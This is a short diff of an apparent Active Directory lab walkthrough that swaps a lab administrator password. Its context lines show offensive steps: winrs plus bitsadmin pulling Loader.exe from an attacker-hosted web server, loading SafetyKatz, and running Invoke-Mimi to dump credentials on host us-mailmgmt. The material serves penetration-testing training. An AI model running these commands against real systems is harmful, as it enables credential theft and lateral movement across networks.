@@ -46,7 +46,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "%Pw
 we could also use bitsadmin, a Microsoft signed binary to download NetLoader on usmailmgmt. Remember to host Loader.exe on a local web server on your student VM.
 
 ```
-winrs -r:us-mailmgmt -u:.\administrator -p:684@@2O0Ybz$#N  "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe
+winrs -r:us-mailmgmt -u:.\administrator -p:-7v0;-X$(41w@[  "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe
 ```
 
 ### PowerShell Remoting and Invoke-Mimi
@@ -54,7 +54,7 @@ winrs -r:us-mailmgmt -u:.\administrator -p:684@@2O0Ybz$#N  "bitsadmin /transfer 
 We will use Invoke-Mimi on us-mailmgmt to extract credentials.
 
 ```
-$passwd = ConvertTo-SecureString '684@@2O0Ybz$#N' -AsPlainText -Force
+$passwd = ConvertTo-SecureString '-7v0;-X$(41w@[' -AsPlainText -Force
 ```
 
 ```
